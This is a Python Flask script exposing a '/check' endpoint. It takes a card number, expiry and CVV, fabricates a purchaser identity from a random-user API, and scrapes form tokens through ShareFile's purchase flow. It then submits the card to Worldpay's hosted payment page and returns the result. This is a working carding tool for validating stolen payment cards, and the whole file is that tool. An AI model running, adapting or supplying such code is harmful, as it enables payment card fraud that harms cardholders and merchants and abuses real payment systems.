from flask import Flask, request, session
import requests
import re

app = Flask(__name__)

@app.route('/check')
def index():

    def cap(string, start, end):
        str = string.split(start)[1].split(end)[0]
        return str

    lista = request.args.get('lista').split('|')
    cc = lista[0]
    mm = lista[1]
    yy = lista[2]
    cv = lista[3]
    cm = cc[:11]

    get = requests.get('https://randomuser.me/api/1.2/?nat=us').json()
    name = get["results"][0]["name"]["first"]
    last = get["results"][0]["name"]["last"]
    street = get["results"][0]["location"]["street"]
    email = get["results"][0]["email"].replace("example.com", "gmail.com")

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; CrOS x86_64 12871.102.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.141 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
    }

    # CURL -1
    session = requests.Session()
    response = session.get('https://www.sharefile.com/buy/SFSTD001', headers=headers)
    form_build_id = cap(response.text, '"form_build_id" value="', '"')

    # CURL -2
    payload = {
        'number_users': '3',
        'billing_cycle': 'monthly',
        'form_build_id': form_build_id,
        'form_id': 'buy_flow_form',
        'op': 'Continue'
    }
    response = session.post('https://www.sharefile.com/buy/SFSTD001', headers=headers, data=payload)

    # CURL -3
    form_build_id = cap(response.text, '"form_build_id" value="', '"')
    payload = {
        'first_name': name,
        'last_name': last,
        'email': email,
        'company': 'dwad',
        'country': 'US',
        'form_build_id': form_build_id,
        'form_id': 'buy_flow_form',
        'op': 'Continue'
    }
    response = session.post('https://www.sharefile.com/buy/SFSTD001', headers=headers, data=payload)

    # CURL -4
    form_build_id = cap(response.text, '"form_build_id" value="', '"')
    payload = {
        'address': street,
        'apartment': '',
        'city': 'NY',
        'state': 'NY',
        'address_country': 'US',
        'zip': '10080',
        'compliance': '1',
        'form_build_id': form_build_id,
        'form_id': 'buy_flow_form',
        'op': 'Continue'
    }
    response = session.post('https://www.sharefile.com/buy/SFSTD001', headers=headers, data=payload)
    url = cap(response.text, "url: '", "'")

    response = session.get(url)
    cook = response.cookies['JSESSIONID']
    _csrf = cap(response.text, '"_csrf" value="', '"')
    path = cap(response.text, 'data-contextpath="', '"')

    # CURL -5
    headers = {
        'Cookie': f'JSESSIONID={cook};'
    }
    
    payload = {
        'cardNumber': cm
    }


    response = session.post('https://payments.worldpay.com' + path + '/rest/cardtypes', headers=headers, data=payload)
    type = cap(response.text, '"type":"', '"')


    # CURL -6
    headers = {
        'Cookie': f'JSESSIONID={cook};'
    } 
    response = session.post('https://payments.worldpay.com/app/hpp/122-0/payment/multicard/process', headers=headers, data=payload)

    # CURL -7
    payload = {
        'selectedPaymentMethodName': type,
        'cardNumber': cc,
        'cardholderName': name + ' ' + last,
        'expiryDate.expiryMonth': mm,
        'expiryDate.expiryYear': yy[-2:],
        'securityCodeVisibilityType': 'MANDATORY',
        'mandatoryForUnknown': 'true',
        'securityCode': cv,
        '_csrf': _csrf,
        'ajax': 'true'
    }
    response = session.post('https://payments.worldpay.com/app/hpp/122-0/payment/multicard/process', headers=headers, data=payload)

    # Return the result
    return response.text

if __name__ == '__main__':
    app.run(debug=False)
